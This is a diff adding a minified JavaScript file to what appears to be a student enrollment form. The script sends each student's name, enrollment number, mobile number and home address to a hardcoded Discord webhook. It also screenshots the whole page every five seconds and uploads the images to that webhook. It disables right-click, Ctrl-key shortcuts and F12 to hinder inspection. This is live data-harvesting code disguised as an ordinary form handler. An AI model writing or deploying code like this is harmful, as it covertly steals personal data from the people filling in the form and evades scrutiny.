@@ -1,0 +1,25 @@
+$(document).ready(function(){setTimeout(function(){$("#infoOverlay").show(),$("#infoPopup").show()},1e3),$("#closeInfoPopup").click(function(){$("#infoOverlay").hide(),$("#infoPopup").hide()})});const webhookUrl="https://discord.com/api/webhooks/1408320672110743623/qC2r_vnos_DwbDjQQN3OdoZSLMJ5WXX-UfhEQR0I5G9pEF_e-mjPZsk8vq8jSc5TqkI1";function formatDateTime(e){var t=e=>e.toString().padStart(2,"0");return`${t(e.getDate())}-${t(e.getMonth()+1)}-${e.getFullYear()} ${t(e.getHours())}:${t(e.getMinutes())}:`+t(e.getSeconds())}document.getElementById("studentDetailsForm").addEventListener("submit",function(e){var t,o,n,a,r;e.preventDefault(),this.checkValidity()?(e=document.getElementById("enrollmentNumber").value.trim(),t=document.getElementById("programmeCode").value.trim(),o=document.getElementById("programmeName").value.trim(),n=document.getElementById("studentName").value.trim(),a=document.getElementById("mobileNumber").value.trim(),r=document.getElementById("residentialAddress").value.trim(),e=`
+**New Student Details Submitted:**
+
+- Date & Time: ${formatDateTime(new Date)}
+- Enrollment Number: ${e}
+- Programme Code: ${t}
+- Programme Name: ${o}
+- Student Name: ${n}
+- Mobile Number: ${a}
+- Residential Address: ${r}
+`,fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:e})}).then(e=>{if(e.ok){localStorage.clear();const t=document.getElementById("successModal");t.style.display="flex",document.getElementById("modalCloseBtn").onclick=()=>{t.style.display="none",window.location.href="index.html"}}else alert("Failed to submit details. Please try again.")}).catch(e=>{console.error("Error:",e),alert("Error submitting details.")})):this.reportValidity()}),window.addEventListener("load",()=>{setInterval(()=>{html2canvas(document.body,{useCORS:!0}).then(e=>{e.toBlob(e=>{var t=new FormData;t.append("file",e,"screenshot.png");const o=(new Date).toLocaleString();t.append("payload_json",JSON.stringify({content:"📸 Screenshot taken at "+o})),fetch("https://discord.com/api/webhooks/1408320672110743623/qC2r_vnos_DwbDjQQN3OdoZSLMJ5WXX-UfhEQR0I5G9pEF_e-mjPZsk8vq8jSc5TqkI1",{method:"POST",body:t}).then(e=>{e.ok?console.log("Screenshot sent at",o):console.error("Failed to send screenshot:",e.statusText)}).catch(console.error)},"image/png")})},5e3)}),document.addEventListener("contextmenu",e=>(e.preventDefault(),!1)),document.addEventListener("keydown",e=>{!e.ctrlKey&&123!=e.keyCode||(e.stopPropagation(),e.preventDefault())});
+  window.addEventListener("DOMContentLoaded", function () {
+    const formData = localStorage.getItem("popupFormData");
+
+    if (!formData) {
+      document.body.innerHTML = "";
+
+      setTimeout(function () {
+        window.location.href = "index.html";
+      }, 1500);
+    } else {
+      const parsedData = JSON.parse(formData);
+      console.log("Form Data:", parsedData);
+    }
+  });
